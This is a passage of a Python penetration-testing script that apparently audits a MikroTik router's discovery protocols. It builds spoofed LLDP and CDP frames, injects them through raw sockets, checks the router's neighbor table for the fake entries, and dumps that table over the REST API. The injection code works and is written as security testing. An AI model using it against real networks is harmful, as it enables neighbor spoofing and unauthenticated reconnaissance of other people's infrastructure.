            for line in r.stdout.split("\n"):
                if ":" in line and "lo" not in line.split(":")[1]:
                    iface = line.split(":")[1].strip()
                    if iface:
                        interfaces.append(iface)
        except:
            interfaces = ["eth0"]

        if interfaces:
            iface = interfaces[0]
            s.bind((iface, 0))

            # Build full Ethernet frame
            dst_mac = b"\x01\x80\xc2\x00\x00\x0e"  # LLDP multicast
            src_mac = b"\xDE\xAD\xBE\xEF\x00\x01"  # fake source
            ethertype = struct.pack(">H", 0x88cc)
            full_frame = dst_mac + src_mac + ethertype + lldp_frame

            s.send(full_frame)
            ec.add_test("cdp_lldp", "LLDP frame injection",
                        f"Inject spoofed LLDP frame via {iface}",
                        f"LLDP frame injected ({len(full_frame)} bytes)",
                        {"interface": iface, "frame_size": len(full_frame),
                         "dst_mac": "01:80:c2:00:00:0e",
                         "ethertype": "0x88cc"})
        else:
            ec.add_test("cdp_lldp", "LLDP frame injection",
                        "LLDP injection", "No suitable network interface found")

        s.close()
    except PermissionError:
        ec.add_test("cdp_lldp", "LLDP frame injection",
                    "Inject spoofed LLDP frame",
                    "Permission denied — need root for raw L2 socket")
    except Exception as e:
        ec.add_test("cdp_lldp", "LLDP frame injection",
                    "LLDP injection", f"Error: {e}")

    # Check if injected LLDP entry appears in neighbor table
    time.sleep(2)
    try:
        status, data = rest_get("/ip/neighbor")
        if status == 200 and isinstance(data, list):
            lldp_neighbors = [n for n in data if "SPOOFED" in str(n.get("identity", ""))]
            ec.add_test("cdp_lldp", "LLDP injection verification",
                        "Check if spoofed LLDP entry appears in neighbor table",
                        f"Total neighbors: {len(data)}, spoofed LLDP: {len(lldp_neighbors)}",
                        {"total": len(data), "spoofed_found": len(lldp_neighbors),
                         "all_neighbors": data},
                        anomaly=len(lldp_neighbors) > 0)
    except Exception as e:
        ec.add_test("cdp_lldp", "LLDP injection verification",
                    "Verify LLDP injection", f"Error: {e}")

    # ── Test 9-12: CDP frame tests ──────────────────────────────────────
    log("  Testing CDP...")

    def build_cdp_frame():
        """Build a minimal CDP frame payload."""
        # CDP version 2
        frame = b"\x02"  # version
        frame += b"\xb4"  # TTL (180 seconds)
        frame += b"\x00\x00"  # checksum placeholder

        # Device ID TLV (type=0x0001)
        device_id = b"SPOOFED-CDP-ROUTER"
        frame += struct.pack(">HH", 0x0001, 4 + len(device_id)) + device_id

        # Software Version TLV (type=0x0005)
        version = b"RouterOS 7.20.8 SPOOFED"
        frame += struct.pack(">HH", 0x0005, 4 + len(version)) + version

        # Platform TLV (type=0x0006)
        platform = b"MikroTik CHR"
        frame += struct.pack(">HH", 0x0006, 4 + len(platform)) + platform

        return frame

    cdp_frame = build_cdp_frame()
    ec.add_test("cdp_lldp", "CDP frame construction",
                "Build spoofed CDP frame for testing",
                f"CDP frame: {len(cdp_frame)} bytes",
                {"frame_hex": cdp_frame.hex()[:200], "frame_size": len(cdp_frame)})

    # Try CDP injection
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x2000))
        if interfaces:
            iface = interfaces[0]
            s.bind((iface, 0))

            # CDP multicast: 01:00:0c:cc:cc:cc, EtherType: usually via LLC/SNAP
            # SNAP header: 0xAA 0xAA 0x03 0x00 0x00 0x0C 0x20 0x00
            dst_mac = b"\x01\x00\x0c\xcc\xcc\xcc"
            src_mac = b"\xDE\xAD\xBE\xEF\x00\x02"
            llc_snap = b"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
            length = struct.pack(">H", len(llc_snap) + len(cdp_frame))
            full_frame = dst_mac + src_mac + length + llc_snap + cdp_frame

            s.send(full_frame)
            ec.add_test("cdp_lldp", "CDP frame injection",
                        f"Inject spoofed CDP frame via {iface}",
                        f"CDP frame injected ({len(full_frame)} bytes)",
                        {"interface": iface, "frame_size": len(full_frame)})
        s.close()
    except PermissionError:
        ec.add_test("cdp_lldp", "CDP frame injection",
                    "Inject spoofed CDP frame",
                    "Permission denied — need root for raw L2 socket")
    except Exception as e:
        ec.add_test("cdp_lldp", "CDP frame injection",
                    "CDP injection", f"Error: {e}")

    # ── Test 13-16: Discovery protocol information disclosure summary ────
    log("  Summarizing discovery protocol information disclosure...")

    # Get full neighbor table
    try:
        status, data = rest_get("/ip/neighbor")
        if status == 200 and isinstance(data, list):
            ec.add_test("cdp_lldp", "Neighbor table dump",
                        "Dump complete neighbor discovery table via REST API",
                        f"Total neighbors: {len(data)}",
                        {"neighbor_count": len(data), "neighbors": data},
                        anomaly=len(data) > 0)

            for i, neighbor in enumerate(data[:10]):
                fields = {k: v for k, v in neighbor.items() if v and k != ".id"}
                ec.add_test("cdp_lldp", f"Neighbor {i+1} details",
                            f"Analyze information disclosed for neighbor {i+1}",
                            f"Fields: {list(fields.keys())}",
                            {"neighbor": fields})
    except Exception as e:
        ec.add_test("cdp_lldp", "Neighbor table dump",
                    "Neighbor table query", f"Error: {e}")

    # ── Test 17-20: Discovery protocol security assessment ───────────────
    ec.add_test("cdp_lldp", "Discovery protocol security summary",
                "Overall security assessment of discovery protocols",
                "MNDP/CDP/LLDP are unauthenticated L2/L3 protocols. "
                "They disclose device identity, version, platform, and addresses "
                "to any host that can receive the frames.",
                {"protocols_assessed": ["MNDP", "CDP", "LLDP"],
                 "common_risks": [
                     "Information disclosure (device type, version, addresses)",
                     "Spoofing (inject fake neighbor entries)",
                     "Reconnaissance (map network topology without authentication)",
                     "No encryption or authentication on any protocol",
                 ]})

    # Check what discovery protocols are configured
    try:
        status, data = rest_get("/ip/neighbor/discovery-settings")
        if status == 200 and isinstance(data, dict):
            protocol_setting = data.get("protocol", "unknown")
            ec.add_test("cdp_lldp", "Active discovery protocols",
                        "Identify which discovery protocols are actively configured",
                        f"Configured protocol(s): {protocol_setting}",
                        {"protocol": protocol_setting, "full_config": data})
    except:
        pass

    check_router_alive()

    # Cleanup capture file
    try:
        os.remove("/tmp/cdp_lldp_capture.pcap")
    except:
        pass


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"Starting discovery protocol attacks against {TARGET}")
    log("=" * 60)

    mndp_tests()
    mac_telnet_tests()
    cdp_lldp_tests()

    # Pull router logs and save evidence
    ec.save("discovery_attacks.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
